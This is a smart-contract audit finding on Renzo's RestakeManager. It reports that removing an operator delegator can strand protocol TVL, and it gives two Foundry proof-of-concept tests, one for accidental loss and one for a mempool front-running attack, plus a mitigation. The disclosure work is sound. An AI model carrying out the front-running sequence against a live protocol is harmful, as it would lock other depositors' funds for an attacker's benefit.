# Vulnerability details

## Impact

Due to absence of safety mechanisms, removal of operator delegators can lead to loss of TVL, which will be locked in funds that operators hold: both native ETH, as well as ERC-20 tokens. This can happen both unintentionally, as well as from front-running attacks being timed with the removal transaction.

## Vulnerability Summary

Function [RestakeManager::removeOperatorDelegator()](https://github.com/code-423n4/2024-04-renzo/blob/519e518f2d8dec9acf6482b84a181e403070d22d/contracts/RestakeManager.sol#L160-L184) doesn't have any checks if the removed operator delegator holds protocol's TVL. We assume that when an operator is to be removed, measures may be taken to prevent this; but such measures are obviously not enough, as any _on-chain_ protection mechanisms are missing.

This may lead to at least two ways how TVL may be locked/lost with removed operator delegators:

- **Unintentional lock**: a user's deposit transaction may be submitted close to the removal transaction, committed  before the removal transaction, and allocate the funds to the to-be-removed operator
- **Frontrunning attack**: attackers may monitor the mempool for a removal transaction and intentionally frontrun such transaction, preceding it with two, and concluding with one:
  1. deposit a large amount of tokens, ensuring they will land with the to-be-removed operator;
  2. withdraw the same amount;
  3. after the cooldown period elapses, claim the tokens withdrawn in step 2.
  4. As a result, attackers will recover all their funds, but a large portion of protocol TVL will be locked in the removed operator.


Additionally, when a collateral token is removed, TVL experiences a sudden drop, which most probably can be gamed to execute other attacks on the protocol.

## Proof of Concept

Download [this rudimentary test suite](https://gist.github.com/codew4sp/a69da0cd6904f9fc794dac0ebe9b2ed4), and place all files into the `test` folder. Execute with `forge test --match-test RemoveOperator`

The following test demonstrates how TVL may be lost unintentionally:

```solidity
function test_TVL_Loss_On_RemoveOperator() public {
        // Normal deposits (e.g. alice deposits token1)
        vm.startPrank(alice);
        token1.approve(address(restakeManager), 2000 * 10**18);
        restakeManager.deposit(token1, 2000 * 10**18);
        (operatorTokenTVLs, operatorTVLs, totalTVL) = restakeManager.calculateTVLs();
        assertEq(totalTVL, 2000 * 10**18);
        // First deposit goes to operator1; 1000 * 10**18 fills the withdraw buffer
        assertEq(operatorTVLs[0], 1000 * 10**18);
        assertEq(operatorTVLs[1], 0);

        // Restake manager decides to remove operator2
        // and submits removeOperatorDelegator transaction
        
        // // In parallel, unsuspecting bob decides to deposit token1
        vm.startPrank(bob);
        token1.approve(address(restakeManager), 1000 * 10**18);
        restakeManager.deposit(token1, 1000 * 10**18);
        (operatorTokenTVLs, operatorTVLs, totalTVL) = restakeManager.calculateTVLs();
        assertEq(totalTVL, 3000 * 10**18);
        // Second deposit goes to operator2;
        assertEq(operatorTVLs[0], 1000 * 10**18);
        assertEq(operatorTVLs[1], 1000 * 10**18);

        // Manager's transaction gets executed
        vm.startPrank(address(this));
        restakeManager.removeOperatorDelegator(operator2);

        // All value locked in operator2 is lost for the protocol
        (operatorTokenTVLs, operatorTVLs, totalTVL) = restakeManager.calculateTVLs();
        assertEq(totalTVL, 2000 * 10**18);
    }
```

This test demonstrates how an attacker can lock TVL with the removed operator:

```solidity
    function test_Frontrun_RemoveOperator() public {
        // Normal deposits (e.g. alice deposits token1)
        vm.startPrank(alice);
        token1.approve(address(restakeManager), 1112 * 10**18);
        restakeManager.deposit(token1, 1112 * 10**18);
        (operatorTokenTVLs, operatorTVLs, totalTVL) = restakeManager.calculateTVLs();
        assertEq(totalTVL, 1112 * 10**18);
        // First deposit goes to operator1; 1000 * 10**18 fills the withdraw buffer
        assertEq(operatorTVLs[0], 112 * 10**18);
        assertEq(operatorTVLs[1], 0);

        // Restake manager decides to remove operator2
        // and submits removeOperatorDelegator transaction
        
        // Bob is adversarial: he notices removeOperatorDelegator transaction in the mempool,
        // and frontruns it, by depositing to operator2, then withdrawing
        vm.startPrank(bob);
        token1.approve(address(restakeManager), 1000 * 10**18);
        restakeManager.deposit(token1, 1000 * 10**18);
        (operatorTokenTVLs, operatorTVLs, totalTVL) = restakeManager.calculateTVLs();
        assertEq(totalTVL, 2112 * 10**18);
        // Second deposit goes to operator2 (because operator1 holds >= 10% TVL)
        assertEq(operatorTVLs[0], 112 * 10**18);
        assertEq(operatorTVLs[1], 1000 * 10**18);
        // Now withdraw (due to rounding, bob's balance is slightly < 1000 * 10**18)
        assertEq(ezETH.balanceOf(bob), 999999999999999996596);     
        ezETH.approve(address(withdrawQueue), 999999999999999996596);
        withdrawQueue.withdraw(999999999999999996596, address(token1));

        // // Manager's transaction gets executed
        vm.startPrank(address(this));
        restakeManager.removeOperatorDelegator(operator2);

        // All value locked in operator2 is lost for the protocol
        (operatorTokenTVLs, operatorTVLs, totalTVL) = restakeManager.calculateTVLs();
        assertEq(totalTVL, 1112 * 10**18);

        // Cooldown period passes
        vm.warp(block.timestamp + COOLDOWN_PERIOD);

        // Bob is able to retrieve his value in token1
        vm.startPrank(bob);
        withdrawQueue.claim(0);
        assertEq(token1.balanceOf(bob), 999999999999999999998207); // ~ 1000 * 10**18
        
        // The protocol and its users are left empty-handed
        (operatorTokenTVLs, operatorTVLs, totalTVL) = restakeManager.calculateTVLs();
        assertEq(totalTVL, 112000000000000001793); 
        // ~ 112 * 10**18, instead of 1112 * 10**18
    }
```

## Recommended Mitigation Steps

We recommend to split removal of operator delegator into three phases:

1. Start removal: prohibit making new deposits to the to-be-removed operator (`setOperatorDelegatorAllocation` can be used for that purpose);
2. Sweep phase: instruct operator to return all funds to the protocol. 
3. Finalize removal: sweep all funds from the removed operator. Ensure that no funds remain locked with the removed operator.
